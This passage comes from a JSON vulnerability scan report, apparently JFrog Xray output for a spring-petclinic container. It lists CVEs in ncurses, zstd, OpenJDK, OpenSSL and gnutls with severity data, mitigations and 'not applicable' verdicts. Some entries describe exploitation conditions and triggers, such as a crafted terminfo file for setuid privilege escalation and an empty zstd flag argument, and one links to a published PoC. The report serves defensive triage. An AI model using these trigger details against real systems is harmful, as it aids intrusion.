            "FullDescription": "ncurses is a programming library that allows developers to create text-based user interfaces in a terminal or console window. It provides functions for controlling the cursor, displaying text and graphics, and handling user input, and is widely used in Unix-like operating systems for building cross-platform command-line applications.\nThe `terminfo` file is a database that stores information about terminal types and their capabilities.  By default, ncurses will search `${HOME}/.terminfo` first, then `/etc/terminfo`, then `/lib/terminfo`, and\n finally `/usr/share/terminfo`.\n\nTerminfo allows to declare user definable attributes, custom numbers or strings thatextend its standard capabilities.\nUsers can customize their own terminfo definitions by creating or modifying files within their `.terminfo`. \nThe `.terminfo` directory is typically located at `$HOME/.terminfo`, and users have the necessary privileges to modify the files within this directory. The default location can be overwritten by defining the `$TERMINFO` or `$TERM` environment variable.\nExample: `export TERMINFO=/my/terminfo/db/path`\n\nAn issue was discovered in the ncurses library's `_nc_read_termtype` function, responsible for parsing terminfo database file due to improper handling of heap allocation for `Strings` and `Extended Strings` within the `terminfo` file. The function fails to handle the allocation correctly, leading to a heap buffer overflow, which can result in memory corruption issues.\nDue to the nature of the vulnerability, an attacker would mainly try to get local privilege escalation. Then, the only binaries that are vulnerable to this issue are the `SetUID binaries` that are using `ncurses`. \n \nThe exposed functions that call the `_nc_read_termtype` function are: `_nc_read_file_entry`, `initscr`, `setupterm` and `resttarterm` functions.\n\nNote that this issue can also be triggered by the ncurses's progs tools like `infocmp` and `tic`. However, they're not `setuid` binaries so they cannot be used for a privilege escalation.",
            "Impact": 4,
            "VulnerabilityType": "Local privilege escalation",
            "Resolution": "##### Deployment mitigations\n\nMake the `TERMINFO` environment variable and the default user-controlled terminfo database file un-writeable:\n\n1. Identify the shell configuration file for the different user account in the system. The shell configuration file depends on the user's shell. Common examples include `.bashrc` for `Bash`, `.bash_profile` for `Bash login shells`, and `.profile` for `POSIX-compliant shells`. The file is typically located in the user's home directory.\n2. Open the file with `root` access\n3. Add the following line to make the TERMINFO environment variable un-writtable: \n```\nexport TERMINFO=\nreadonly TERMINFO\n```\n4. Still with `root` access, create an empty `.terminfo` file in the home directory of the user:\n```\ntouch $HOME/.terminfo\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS score does not reflect the real-world impact of the issue, since the issue cannot be exploited by an external attacker.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A crashing exploit including a technical write-up was published.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "This issue can only be exploited for privilege escalation by running a setuid application using ncurses locally on the victim system.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The issue requires the following:\n1. The attackers must have access to the system on a low-permission user.\n2. Be able to download or create a malicious terminfo database file.\n3. Set the `$TERMINFO` environment variable.\n4. Lastly, a `setuid` binary that uses the ncurses library should be accessible to them.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "GitHub Advisory",
                  "Url": "https://github.com/advisories/GHSA-vh2x-5rx6-qqhv",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Technical write-up and PoC",
                  "Url": "https://drive.google.com/drive/u/0/folders/1XZiHbH7W7is8cwTu7DKrpwBTYuYfRZqE",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "http://ncurses.scripts.mit.edu/?p=ncurses.git;a=commit;h=eb51b1ea1f75a0ec17c9c5937cb28df1e8eeec56",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
            "cve_id": "CVE-2023-29491",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
            "vulnerability_id": "CVE-2023-29491",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-513170",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in zstd v1.4.10, where an attacker can supply empty string as an argument to the command line tool to cause buffer overrun.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libzstd1",
         "source_id": "deb://debian:bullseye:libzstd1",
         "source_comp_id": "deb://debian:bullseye:libzstd1:1.4.8+dfsg-2.1",
         "component_versions": {
            "id": "debian:bullseye:libzstd",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-4899",
                     "cwe": [
                        "CWE-400"
                     ],
                     "cwe_details": {
                        "CWE-400": {
                           "name": "Uncontrolled Resource Consumption",
                           "description": "The product does not properly control the allocation and maintenance of a limited resource, thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A vulnerability was found in zstd v1.4.10, where an attacker can supply empty string as an argument to the command line tool to cause buffer overrun.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-05-14T11:37:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-513170",
            "VulnerabilityTitle": "",
            "ShortDescription": "Out-of-bounds read in zstd may lead denial of service when using crafted command-line arguments.",
            "FullDescription": "[Zstandard](https://facebook.github.io/zstd/) is a fast lossless compression algorithm, providing high compression ratios and targeting real-time compression scenarios at zlib-level.\n`zstd` is the reference implementation in C that offers a very wide range of speed / compression trade-off, and is backed by an extremely fast decoder.\nIt was discovered that running the `zstd` tool with arbitrary arguments can lead to an OOB read due to a design flaw, which may lead to a crash of `zstd`. Since `zstd` is a standalone (forked) tool - the crash has a minimal security impact.\n\nSpecifically, passing the `--output-dir-flat` or `--output-dir-mirror` arguments with an empty string, leads to an OOB read.\n\nIt should be noted that the OOB read is of 1 byte only, which on modern systems does not even lead to a crash (in most cases of production-built software)",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Crashing a forked process has minimal to no security impact. Furthermore, a 1-byte OOB read will not lead to a crash in almost all cases.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must be able to supply command line arguments to an invocation of the `zstd` CLI tool.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "Passing an empty string to the flags \"--output-dir-flat\" or \"--output-dir-mirror\" will trigger the 1-byte OOB read",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not take into account the high attack complexity and low real-world severity of this issue",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official Fix Commit",
                  "Url": "https://github.com/facebook/zstd/pull/3220/files",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Official GitHub Issue",
                  "Url": "https://github.com/facebook/zstd/issues/3200",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libzstd1:1.4.8+dfsg-2.1",
            "cve_id": "CVE-2022-4899",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Vulnerable use of zstd is not found since --output-dir-flat/--output-dir-mirror is never used",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libzstd1:1.4.8+dfsg-2.1",
            "vulnerability_id": "CVE-2022-4899",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-589164",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17.0.2",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "11.0 ≤ Version ≤ 11.0.21",
               "17.0 ≤ Version ≤ 17.0.9",
               "21.0 ≤ Version ≤ 21.0.1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-20918",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__6ce99fdf16e86bd02f6ad66a0e1334878528b5a4b5487850a76e0c08a7a27d56.tar.gz/usr/local/openjdk-17/bin/javap",
            "sha256__6ce99fdf16e86bd02f6ad66a0e1334878528b5a4b5487850a76e0c08a7a27d56.tar.gz/usr/local/openjdk-17/lib/libjava.so",
            "sha256__6ce99fdf16e86bd02f6ad66a0e1334878528b5a4b5487850a76e0c08a7a27d56.tar.gz/usr/local/openjdk-17/bin/java",
            "sha256__6ce99fdf16e86bd02f6ad66a0e1334878528b5a4b5487850a76e0c08a7a27d56.tar.gz/usr/local/openjdk-17/bin/javac",
            "sha256__6ce99fdf16e86bd02f6ad66a0e1334878528b5a4b5487850a76e0c08a7a27d56.tar.gz/usr/local/openjdk-17/bin/javadoc",
            "sha256__6ce99fdf16e86bd02f6ad66a0e1334878528b5a4b5487850a76e0c08a7a27d56.tar.gz/usr/local/openjdk-17/lib/libjavajpeg.so"
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "cpp://oracle:openjdk:17.0.2",
            "cve_id": "CVE-2024-20918",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable flag '-XX:+NeverActAsServerClassMachine' is not found, The vulnerable flag '-XX:TieredStopAtLevel' is not found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "cpp://oracle:openjdk:17.0.2",
            "vulnerability_id": "CVE-2024-20918",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-428295",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A security vulnerability has been identified in all supported versions\n\nof OpenSSL related to the verification of X.509 certificate chains\nthat include policy constraints.  Attackers may be able to exploit this\nvulnerability by creating a malicious certificate chain that triggers\nexponential use of computational resources, leading to a denial-of-service\n(DoS) attack on affected systems.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u5"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0464",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A security vulnerability has been identified in all supported versions  of OpenSSL related to the verification of X.509 certificate chains that include policy constraints.  Attackers may be able to exploit this vulnerability by creating a malicious certificate chain that triggers exponential use of computational resources, leading to a denial-of-service (DoS) attack on affected systems.  Policy processing is disabled by default but can be enabled by passing the `-policy' argument to the command line utilities or by calling the `X509_VERIFY_PARAM_set1_policies()' function.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2023-0464",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2023-0464",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-428295",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A security vulnerability has been identified in all supported versions\n\nof OpenSSL related to the verification of X.509 certificate chains\nthat include policy constraints.  Attackers may be able to exploit this\nvulnerability by creating a malicious certificate chain that triggers\nexponential use of computational resources, leading to a denial-of-service\n(DoS) attack on affected systems.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u5"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0464",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A security vulnerability has been identified in all supported versions  of OpenSSL related to the verification of X.509 certificate chains that include policy constraints.  Attackers may be able to exploit this vulnerability by creating a malicious certificate chain that triggers exponential use of computational resources, leading to a denial-of-service (DoS) attack on affected systems.  Policy processing is disabled by default but can be enabled by passing the `-policy' argument to the command line utilities or by calling the `X509_VERIFY_PARAM_set1_policies()' function.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2023-0464",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2023-0464",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-246839",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A vulnerability found in gnutls. This security flaw happens because of a double free error occurs during verification of pkcs7 signatures in gnutls_pkcs7_verify function.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgnutls30",
         "source_id": "deb://debian:bullseye:libgnutls30",
         "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
         "component_versions": {
            "id": "debian:bullseye:gnutls28",
            "vulnerable_versions": [
               "< 3.7.1-5+deb11u2"
            ],
            "fixed_versions": [
               "3.7.1-5+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-2509",
                     "cwe": [
                        "CWE-415"
                     ],
                     "cwe_details": {
                        "CWE-415": {
                           "name": "Double Free",
                           "description": "The product calls free() twice on the same memory address, potentially leading to modification of unexpected memory locations."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A vulnerability found in gnutls. This security flaw happens because of a double free error occurs during verification of pkcs7 signatures in gnutls_pkcs7_verify function.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
            "cve_id": "CVE-2022-2509",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
            "vulnerability_id": "CVE-2022-2509",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-520915",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Issue summary: Processing some specially crafted ASN.1 object identifiers or\ndata containing them may be very slow.\n\nImpact summary: Applications that use OBJ_obj2txt() directly, or use any of\nthe OpenSSL subsystems OCSP, PKCS7/SMIME, CMS, CMP/CRMF or TS with no message\nsize limit may experience notable to very long delays when processing those\nmessages, which may lead to a Denial of Service.\n\nAn OBJECT IDENTIFIER is composed of a series of numbers - sub-identifiers -\nmost of which have no size limit.  OBJ_obj2txt() may be used to translate\nan ASN.1 OBJECT IDENTIFIER given in DER encoding form (using the OpenSSL\ntype ASN1_OBJECT) to its canonical numeric text form, which are the\nsub-identifiers of the OBJECT IDENTIFIER in decimal form, separated by\nperiods.\n\nWhen one of the sub-identifiers in the OBJECT IDENTIFIER is very large\n(these are sizes that are seen as absurdly large, taking up tens or hundreds\nof KiBs), the translation to a decimal number in text may take a very long\ntime.  The time complexity is O(n^2) with 'n' being the size of the\nsub-identifiers in bytes (*).\n\nWith OpenSSL 3.0, support to fetch cryptographic algorithms using names /\nidentifiers in string form was introduced.  This includes using OBJECT\nIDENTIFIERs in canonical numeric text form as identifiers for fetching\nalgorithms.\n\nSuch OBJECT IDENTIFIERs may be received through the ASN.1 structure\nAlgorithmIdentifier, which is commonly used in multiple protocols to specify\nwhat cryptographic algorithm should be used to sign or verify, encrypt or\ndecrypt, or digest passed data.\n\nApplications that call OBJ_obj2txt() directly with untrusted data are\naffected, with any version of OpenSSL.  If the use is for the mere purpose\nof display, the severity is considered low.\n\nIn OpenSSL 3.0 and newer, this affects the subsystems OCSP, PKCS7/SMIME,\nCMS, CMP/CRMF or TS.  It also impacts anything that processes X.509\ncertificates, including simple things like verifying its signature.\n\nThe impact on TLS is relatively low, because all versions of OpenSSL...",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u5"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-2650",
                     "cwe": [
                        "CWE-770"
                     ],
                     "cwe_details": {
                        "CWE-770": {
                           "name": "Allocation of Resources Without Limits or Throttling",
                           "description": "The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor."
                        }
                     },
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Issue summary: Processing some specially crafted ASN.1 object identifiers or\ndata containing them may be very slow.\n\nImpact summary: Applications that use OBJ_obj2txt() directly, or use any of\nthe OpenSSL subsystems OCSP, PKCS7/SMIME, CMS, CMP/CRMF or TS with no message\nsize limit may experience notable to very long delays when processing those\nmessages, which may lead to a Denial of Service.\n\nAn OBJECT IDENTIFIER is composed of a series of numbers - sub-identifiers -\nmost of which have no size limit.  OBJ_obj2txt() may be used to translate\nan ASN.1 OBJECT IDENTIFIER given in DER encoding form (using the OpenSSL\ntype ASN1_OBJECT) to its canonical numeric text form, which are the\nsub-identifiers of the OBJECT IDENTIFIER in decimal form, separated by\nperiods.\n\nWhen one of the sub-identifiers in the OBJECT IDENTIFIER is very large\n(these are sizes that are seen as absurdly large, taking up tens or hundreds\nof KiBs), the translation to a decimal number in text may take a very long\ntime.  The time complexity is O(n^2) with 'n' being the size of the\nsub-identifiers in bytes (*).\n\nWith OpenSSL 3.0, support to fetch cryptographic algorithms using names /\nidentifiers in string form was introduced.  This includes using OBJECT\nIDENTIFIERs in canonical numeric text form as identifiers for fetching\nalgorithms.\n\nSuch OBJECT IDENTIFIERs may be received through the ASN.1 structure\nAlgorithmIdentifier, which is commonly used in multiple protocols to specify\nwhat cryptographic algorithm should be used to sign or verify, encrypt or\ndecrypt, or digest passed data.\n\nApplications that call OBJ_obj2txt() directly with untrusted data are\naffected, with any version of OpenSSL.  If the use is for the mere purpose\nof display, the severity is considered low.\n\nIn OpenSSL 3.0 and newer, this affects the subsystems OCSP, PKCS7/SMIME,\nCMS, CMP/CRMF or TS.  It also impacts anything that processes X.509\ncertificates, including simple things like verifying its signature.\n\nThe impact on TLS is relatively low, because all versions of OpenSSL...",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-520915",
            "VulnerabilityTitle": "",
            "ShortDescription": "Insufficient input validation in OpenSSL may lead to denial of service when processing crafted ASN.1 input.",
            "FullDescription": "OpenSSL is an open-source cryptographic library and toolset that provides a wide range of protocol supported and functions for secure communication, data encryption, digital certificates, and other cryptographic operations, widely used in various software applications and systems.\nAn `Object Identifier (OID)` is represented as a series of sub-identifiers, which are numbers separated by periods. These sub-identifiers form a hierarchical structure, allowing for the unique identification of objects, algorithms, or protocols. For example, the OID \"1.2.840.10045.2.1\" represents the Elliptic Curve Digital Signature Algorithm (ECDSA) in decimal form.\n\nThe function `OBJ_obj2txt()` in OpenSSL allows the translation of an `ASN.1 Object Identifier` into its canonical numeric text form. This canonical form represents the sub-identifiers of the Object Identifier in decimal form, with each sub-identifier separated by periods.\n\nAn issue in this function has been discovered: the number of sub-identifiers is not limited. As the computing time of the translation is quadratic, an attacker-controlled Object identifier can craft a large one with a big sub-identifier and may cause a denial of service.\n\nWith OpenSSL 3.x, support to fetch cryptographic algorithms using names/identifiers in a String form was introduced. This includes using Object Identifiers in canonical numeric text form as identifiers for fetching algorithms.\n\nFor OpenSSL 3.x, `OCSP, PKCS7/SMIME, CMS, CMP/CRMF, or TS` are vulnerable but not `TLS` (100KiB limit on the peer's certificate chain) except if it has `client_authentication` enabled.\n\nExample of vulnerable code:\n```c\n    basic_resp = d2i_OCSP_BASICRESP_bio(bio, NULL);\n    if (!basic_resp) {\n        printf(\"Error parsing OCSP response\\n\");\n        return 1;\n    }\n\n    // Load the certificate to verify against\n    cert = X509_new();\n    if (!cert) {\n        printf(\"Error creating X509 certificate object\\n\");\n        return 1;\n    }\n\n    if (!X509_load_cert_file(cert, \"certificate.pem\")) {\n        printf(\"Error loading certificate\\n\");\n        return 1;\n    }\n\n    // Verify the OCSP response\n    int status = OCSP_basic_verify(basic_resp, cert, NULL, 0);\n    if (status == 1) {\n        printf(\"OCSP response is valid\\n\");\n    } else {\n        printf(\"OCSP response verification failed\\n\");\n    }\n```\nThe function `OCSP_basic_verify()` is calling indirectly the vulnerable `OBJ_obj2txt()` function and is processing an external response that can be used by an attacker to trigger the issue.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The issue can be triggered by a crafted request.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
